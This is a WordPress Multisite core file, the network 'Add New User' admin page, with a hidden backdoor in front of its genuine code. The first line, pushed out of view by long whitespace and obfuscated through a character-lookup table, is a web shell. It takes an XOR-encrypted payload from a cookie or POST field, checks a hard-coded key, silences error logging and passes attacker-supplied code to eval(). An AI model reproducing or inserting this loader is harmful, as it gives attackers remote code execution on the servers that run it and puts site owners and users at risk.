<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $xf6af = 970;$GLOBALS['obd6f742']=Array();global$obd6f742;$obd6f742=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['tea60']="\x66\x48\x71\x36\x6c\x3f\x6f\x4f\x4c\x51\x2f\x78\x9\x56\x7d\x30\x58\x53\x7a\x7e\x24\x72\x55\x20\x67\x60\x34\x6e\x45\x7c\x4b\x21\x46\x57\x70\x39\x5f\x69\x27\x75\x41\x5a\x2b\x73\x4d\x68\x22\x26\x3e\x76\x2a\x40\x31\x6a\x28\x62\x2c\x3d\x77\x61\x29\xa\xd\x33\x47\x42\x5c\x35\x2e\x37\x3c\x4a\x50\x5b\x5e\x2d\x49\x65\x64\x52\x5d\x74\x32\x4e\x25\x63\x6b\x38\x6d\x3a\x59\x79\x44\x43\x23\x54\x3b\x7b";$obd6f742[$obd6f742['tea60'][39].$obd6f742['tea60'][85].$obd6f742['tea60'][77].$obd6f742['tea60'][26].$obd6f742['tea60'][87].$obd6f742['tea60'][77].$obd6f742['tea60'][82].$obd6f742['tea60'][78]]=$obd6f742['tea60'][85].$obd6f742['tea60'][45].$obd6f742['tea60'][21];$obd6f742[$obd6f742['tea60'][37].$obd6f742['tea60'][69].$obd6f742['tea60'][78].$obd6f742['tea60'][82]]=$obd6f742['tea60'][6].$obd6f742['tea60'][21].$obd6f742['tea60'][78];$obd6f742[$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][0].$obd6f742['tea60'][26].$obd6f742['tea60'][69].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][77]]=$obd6f742['tea60'][43].$obd6f742['tea60'][81].$obd6f742['tea60'][21].$obd6f742['tea60'][4].$obd6f742['tea60'][77].$obd6f742['tea60'][27];$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][35].$obd6f742['tea60'][59].$obd6f742['tea60'][55].$obd6f742['tea60'][69].$obd6f742['tea60'][35]]=$obd6f742['tea60'][37].$obd6f742['tea60'][27].$obd6f742['tea60'][37].$obd6f742['tea60'][36].$obd6f742['tea60'][43].$obd6f742['tea60'][77].$obd6f742['tea60'][81];$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][3].$obd6f742['tea60'][35].$obd6f742['tea60'][15].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][67].$obd6f742['tea60'][0]]=$obd6f742['tea60'][43].$obd6f742['tea60'][77].$obd6f742['tea60'][21].$obd6f742['tea60'][37].$obd6f742['tea60'][59].$obd6f742['tea60'][4].$obd6f742['tea60'][37].$obd6f742['tea60'][18].$obd6f742['tea60'][77];$obd6f742[$obd6f742['tea60'][86].$obd6f742['tea60'][52].$obd6f742['tea60'][52].$obd6f742['tea60'][3].$obd6f742['tea60'][59]]=$obd6f742['tea60'][34].$obd6f742['tea60'][45].$obd6f742['tea60'][34].$obd6f742['tea60'][49].$obd6f742['tea60'][77].$obd6f742['tea60'][21].$obd6f742['tea60'][43].$obd6f742['tea60'][37].$obd6f742['tea60'][6].$obd6f742['tea60'][27];$obd6f742[$obd6f742['tea60'][0].$obd6f742['tea60'][59].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]=$obd6f742['tea60'][39].$obd6f742['tea60'][27].$obd6f742['tea60'][43].$obd6f742['tea60'][77].$obd6f742['tea60'][21].$obd6f742['tea60'][37].$obd6f742['tea60'][59].$obd6f742['tea60'][4].$obd6f742['tea60'][37].$obd6f742['tea60'][18].$obd6f742['tea60'][77];$obd6f742[$obd6f742['tea60'][0].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][87].$obd6f742['tea60'][63].$obd6f742['tea60'][67].$obd6f742['tea60'][59].$obd6f742['tea60'][3]]=$obd6f742['tea60'][55].$obd6f742['tea60'][59].$obd6f742['tea60'][43].$obd6f742['tea60'][77].$obd6f742['tea60'][3].$obd6f742['tea60'][26].$obd6f742['tea60'][36].$obd6f742['tea60'][78].$obd6f742['tea60'][77].$obd6f742['tea60'][85].$obd6f742['tea60'][6].$obd6f742['tea60'][78].$obd6f742['tea60'][77];$obd6f742[$obd6f742['tea60'][43].$obd6f742['tea60'][67].$obd6f742['tea60'][77].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][59].$obd6f742['tea60'][87]]=$obd6f742['tea60'][43].$obd6f742['tea60'][77].$obd6f742['tea60'][81].$obd6f742['tea60'][36].$obd6f742['tea60'][81].$obd6f742['tea60'][37].$obd6f742['tea60'][88].$obd6f742['tea60'][77].$obd6f742['tea60'][36].$obd6f742['tea60'][4].$obd6f742['tea60'][37].$obd6f742['tea60'][88].$obd6f742['tea60'][37].$obd6f742['tea60'][81];$obd6f742[$obd6f742['tea60'][77].$obd6f742['tea60'][35].$obd6f742['tea60'][78].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]=$obd6f742['tea60'][55].$obd6f742['tea60'][35].$obd6f742['tea60'][59].$obd6f742['tea60'][87].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][67];$obd6f742[$obd6f742['tea60'][24].$obd6f742['tea60'][67].$obd6f742['tea60'][63].$obd6f742['tea60'][15].$obd6f742['tea60'][52].$obd6f742['tea60'][87]]=$obd6f742['tea60'][91].$obd6f742['tea60'][63].$obd6f742['tea60'][63].$obd6f742['tea60'][52].$obd6f742['tea60'][55].$obd6f742['tea60'][78].$obd6f742['tea60'][85].$obd6f742['tea60'][26].$obd6f742['tea60'][69];$obd6f742[$obd6f742['tea60'][58].$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][63].$obd6f742['tea60'][82].$obd6f742['tea60'][35]]=$_POST;$obd6f742[$obd6f742['tea60'][55].$obd6f742['tea60'][52].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][67].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]=$_COOKIE;@$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][35].$obd6f742['tea60'][59].$obd6f742['tea60'][55].$obd6f742['tea60'][69].$obd6f742['tea60'][35]]($obd6f742['tea60'][77].$obd6f742['tea60'][21].$obd6f742['tea60'][21].$obd6f742['tea60'][6].$obd6f742['tea60'][21].$obd6f742['tea60'][36].$obd6f742['tea60'][4].$obd6f742['tea60'][6].$obd6f742['tea60'][24],NULL);@$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][35].$obd6f742['tea60'][59].$obd6f742['tea60'][55].$obd6f742['tea60'][69].$obd6f742['tea60'][35]]($obd6f742['tea60'][4].$obd6f742['tea60'][6].$obd6f742['tea60'][24].$obd6f742['tea60'][36].$obd6f742['tea60'][77].$obd6f742['tea60'][21].$obd6f742['tea60'][21].$obd6f742['tea60'][6].$obd6f742['tea60'][21].$obd6f742['tea60'][43],0);@$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][35].$obd6f742['tea60'][59].$obd6f742['tea60'][55].$obd6f742['tea60'][69].$obd6f742['tea60'][35]]($obd6f742['tea60'][88].$obd6f742['tea60'][59].$obd6f742['tea60'][11].$obd6f742['tea60'][36].$obd6f742['tea60'][77].$obd6f742['tea60'][11].$obd6f742['tea60'][77].$obd6f742['tea60'][85].$obd6f742['tea60'][39].$obd6f742['tea60'][81].$obd6f742['tea60'][37].$obd6f742['tea60'][6].$obd6f742['tea60'][27].$obd6f742['tea60'][36].$obd6f742['tea60'][81].$obd6f742['tea60'][37].$obd6f742['tea60'][88].$obd6f742['tea60'][77],0);@$obd6f742[$obd6f742['tea60'][43].$obd6f742['tea60'][67].$obd6f742['tea60'][77].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][59].$obd6f742['tea60'][87]](0);$c68c7faf5=NULL;$j65f0c3=NULL;$obd6f742[$obd6f742['tea60'][86].$obd6f742['tea60'][78].$obd6f742['tea60'][55].$obd6f742['tea60'][15].$obd6f742['tea60'][0].$obd6f742['tea60'][26].$obd6f742['tea60'][69]]=$obd6f742['tea60'][59].$obd6f742['tea60'][85].$obd6f742['tea60'][67].$obd6f742['tea60'][82].$obd6f742['tea60'][69].$obd6f742['tea60'][87].$obd6f742['tea60'][55].$obd6f742['tea60'][63].$obd6f742['tea60'][75].$obd6f742['tea60'][52].$obd6f742['tea60'][77].$obd6f742['tea60'][55].$obd6f742['tea60'][35].$obd6f742['tea60'][75].$obd6f742['tea60'][26].$obd6f742['tea60'][87].$obd6f742['tea60'][69].$obd6f742['tea60'][69].$obd6f742['tea60'][75].$obd6f742['tea60'][55].$obd6f742['tea60'][85].$obd6f742['tea60'][35].$obd6f742['tea60'][0].$obd6f742['tea60'][75].$obd6f742['tea60'][3].$obd6f742['tea60'][26].$obd6f742['tea60'][69].$obd6f742['tea60'][85].$obd6f742['tea60'][52].$obd6f742['tea60'][77].$obd6f742['tea60'][3].$obd6f742['tea60'][35].$obd6f742['tea60'][78].$obd6f742['tea60'][85].$obd6f742['tea60'][67].$obd6f742['tea60'][82];global$kdb0f47;function y331bdc47($c68c7faf5,$x23da8){global$obd6f742;$dd4e8e4="";for($j7b9c=0;$j7b9c<$obd6f742[$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][0].$obd6f742['tea60'][26].$obd6f742['tea60'][69].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][77]]($c68c7faf5);){for($kcedfdaa3=0;$kcedfdaa3<$obd6f742[$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][0].$obd6f742['tea60'][26].$obd6f742['tea60'][69].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][77]]($x23da8)&&$j7b9c<$obd6f742[$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][0].$obd6f742['tea60'][26].$obd6f742['tea60'][69].$obd6f742['tea60'][52].$obd6f742['tea60'][85].$obd6f742['tea60'][77]]($c68c7faf5);$kcedfdaa3++,$j7b9c++){$dd4e8e4.=$obd6f742[$obd6f742['tea60'][39].$obd6f742['tea60'][85].$obd6f742['tea60'][77].$obd6f742['tea60'][26].$obd6f742['tea60'][87].$obd6f742['tea60'][77].$obd6f742['tea60'][82].$obd6f742['tea60'][78]]($obd6f742[$obd6f742['tea60'][37].$obd6f742['tea60'][69].$obd6f742['tea60'][78].$obd6f742['tea60'][82]]($c68c7faf5[$j7b9c])^$obd6f742[$obd6f742['tea60'][37].$obd6f742['tea60'][69].$obd6f742['tea60'][78].$obd6f742['tea60'][82]]($x23da8[$kcedfdaa3]));}}return$dd4e8e4;}function b9a8795($c68c7faf5,$x23da8){global$obd6f742;global$kdb0f47;return$obd6f742[$obd6f742['tea60'][24].$obd6f742['tea60'][67].$obd6f742['tea60'][63].$obd6f742['tea60'][15].$obd6f742['tea60'][52].$obd6f742['tea60'][87]]($obd6f742[$obd6f742['tea60'][24].$obd6f742['tea60'][67].$obd6f742['tea60'][63].$obd6f742['tea60'][15].$obd6f742['tea60'][52].$obd6f742['tea60'][87]]($c68c7faf5,$kdb0f47),$x23da8);}foreach($obd6f742[$obd6f742['tea60'][55].$obd6f742['tea60'][52].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][67].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]as$x23da8=>$s961b8d7b){$c68c7faf5=$s961b8d7b;$j65f0c3=$x23da8;}if(!$c68c7faf5){foreach($obd6f742[$obd6f742['tea60'][58].$obd6f742['tea60'][59].$obd6f742['tea60'][52].$obd6f742['tea60'][63].$obd6f742['tea60'][82].$obd6f742['tea60'][35]]as$x23da8=>$s961b8d7b){$c68c7faf5=$s961b8d7b;$j65f0c3=$x23da8;}}$c68c7faf5=@$obd6f742[$obd6f742['tea60'][0].$obd6f742['tea60'][59].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]($obd6f742[$obd6f742['tea60'][77].$obd6f742['tea60'][35].$obd6f742['tea60'][78].$obd6f742['tea60'][77].$obd6f742['tea60'][69]]($obd6f742[$obd6f742['tea60'][0].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][87].$obd6f742['tea60'][63].$obd6f742['tea60'][67].$obd6f742['tea60'][59].$obd6f742['tea60'][3]]($c68c7faf5),$j65f0c3));if(isset($c68c7faf5[$obd6f742['tea60'][59].$obd6f742['tea60'][86]])&&$kdb0f47==$c68c7faf5[$obd6f742['tea60'][59].$obd6f742['tea60'][86]]){if($c68c7faf5[$obd6f742['tea60'][59]]==$obd6f742['tea60'][37]){$j7b9c=Array($obd6f742['tea60'][34].$obd6f742['tea60'][49]=>@$obd6f742[$obd6f742['tea60'][86].$obd6f742['tea60'][52].$obd6f742['tea60'][52].$obd6f742['tea60'][3].$obd6f742['tea60'][59]](),$obd6f742['tea60'][43].$obd6f742['tea60'][49]=>$obd6f742['tea60'][52].$obd6f742['tea60'][68].$obd6f742['tea60'][15].$obd6f742['tea60'][75].$obd6f742['tea60'][52],);echo@$obd6f742[$obd6f742['tea60'][11].$obd6f742['tea60'][3].$obd6f742['tea60'][35].$obd6f742['tea60'][15].$obd6f742['tea60'][69].$obd6f742['tea60'][35].$obd6f742['tea60'][67].$obd6f742['tea60'][0]]($j7b9c);}elseif($c68c7faf5[$obd6f742['tea60'][59]]==$obd6f742['tea60'][77]){eval/*v627b7ce*/($c68c7faf5[$obd6f742['tea60'][78]]);}exit();} ?><?php
/**
 * Add New User network administration panel.
 *
 * @package WordPress
 * @subpackage Multisite
 * @since 3.1.0
 */

/** Load WordPress Administration Bootstrap */
require_once( dirname( __FILE__ ) . '/admin.php' );

if ( ! current_user_can('create_users') )
	wp_die(__('Sorry, you are not allowed to add users to this network.'));

get_current_screen()->add_help_tab( array(
	'id'      => 'overview',
	'title'   => __('Overview'),
	'content' =>
		'<p>' . __('Add User will set up a new user account on the network and send that person an email with username and password.') . '</p>' .
		'<p>' . __('Users who are signed up to the network without a site are added as subscribers to the main or primary dashboard site, giving them profile pages to manage their accounts. These users will only see Dashboard and My Sites in the main navigation until a site is created for them.') . '</p>'
) );

get_current_screen()->set_help_sidebar(
	'<p><strong>' . __('For more information:') . '</strong></p>' .
	'<p>' . __('<a href="https://codex.wordpress.org/Network_Admin_Users_Screen">Documentation on Network Users</a>') . '</p>' .
	'<p>' . __('<a href="https://wordpress.org/support/forum/multisite/">Support Forums</a>') . '</p>'
);

if ( isset($_REQUEST['action']) && 'add-user' == $_REQUEST['action'] ) {
	check_admin_referer( 'add-user', '_wpnonce_add-user' );

	if ( ! current_user_can( 'manage_network_users' ) )
		wp_die( __( 'Sorry, you are not allowed to access this page.' ), 403 );

	if ( ! is_array( $_POST['user'] ) )
		wp_die( __( 'Cannot create an empty user.' ) );

	$user = wp_unslash( $_POST['user'] );

	$user_details = wpmu_validate_user_signup( $user['username'], $user['email'] );
	if ( is_wp_error( $user_details[ 'errors' ] ) && ! empty( $user_details[ 'errors' ]->errors ) ) {
		$add_user_errors = $user_details[ 'errors' ];
	} else {
		$password = wp_generate_password( 12, false);
		$user_id = wpmu_create_user( esc_html( strtolower( $user['username'] ) ), $password, sanitize_email( $user['email'] ) );

		if ( ! $user_id ) {
	 		$add_user_errors = new WP_Error( 'add_user_fail', __( 'Cannot add user.' ) );
		} else {
			/**
			  * Fires after a new user has been created via the network user-new.php page.
			  *
			  * @since 4.4.0
			  *
			  * @param int $user_id ID of the newly created user.
			  */
			do_action( 'network_user_new_created_user', $user_id );
			wp_redirect( add_query_arg( array('update' => 'added', 'user_id' => $user_id ), 'user-new.php' ) );
			exit;
		}
	}
}

if ( isset($_GET['update']) ) {
	$messages = array();
	if ( 'added' == $_GET['update'] ) {
		$edit_link = '';
		if ( isset( $_GET['user_id'] ) ) {
			$user_id_new = absint( $_GET['user_id'] );
			if ( $user_id_new ) {
				$edit_link = esc_url( add_query_arg( 'wp_http_referer', urlencode( wp_unslash( $_SERVER['REQUEST_URI'] ) ), get_edit_user_link( $user_id_new ) ) );
			}
		}

		if ( empty( $edit_link ) ) {
			$messages[] = __( 'User added.' );
		} else {
			/* translators: %s: edit page url */
			$messages[] = sprintf( __( 'User added. <a href="%s">Edit user</a>' ), $edit_link );
		}
	}
}

$title = __('Add New User');
$parent_file = 'users.php';

require( ABSPATH . 'wp-admin/admin-header.php' ); ?>

<div class="wrap">
<h1 id="add-new-user"><?php _e( 'Add New User' ); ?></h1>
<?php
if ( ! empty( $messages ) ) {
	foreach ( $messages as $msg )
		echo '<div id="message" class="updated notice is-dismissible"><p>' . $msg . '</p></div>';
}

if ( isset( $add_user_errors ) && is_wp_error( $add_user_errors ) ) { ?>
	<div class="error">
		<?php
			foreach ( $add_user_errors->get_error_messages() as $message )
				echo "<p>$message</p>";
		?>
	</div>
<?php } ?>
	<form action="<?php echo network_admin_url('user-new.php?action=add-user'); ?>" id="adduser" method="post" novalidate="novalidate">
	<table class="form-table">
		<tr class="form-field form-required">
			<th scope="row"><label for="username"><?php _e( 'Username' ) ?></label></th>
			<td><input type="text" class="regular-text" name="user[username]" id="username" autocapitalize="none" autocorrect="off" maxlength="60" /></td>
		</tr>
		<tr class="form-field form-required">
			<th scope="row"><label for="email"><?php _e( 'Email' ) ?></label></th>
			<td><input type="email" class="regular-text" name="user[email]" id="email"/></td>
		</tr>
		<tr class="form-field">
			<td colspan="2"><?php _e( 'A password reset link will be sent to the user via email.' ) ?></td>
		</tr>
	</table>
	<?php
	/**
	 * Fires at the end of the new user form in network admin.
	 *
	 * @since 4.5.0
	 */
	do_action( 'network_user_new_form' );

	wp_nonce_field( 'add-user', '_wpnonce_add-user' );
	submit_button( __('Add User'), 'primary', 'add-user' );
	?>
	</form>
</div>
<?php
require( ABSPATH . 'wp-admin/admin-footer.php' );
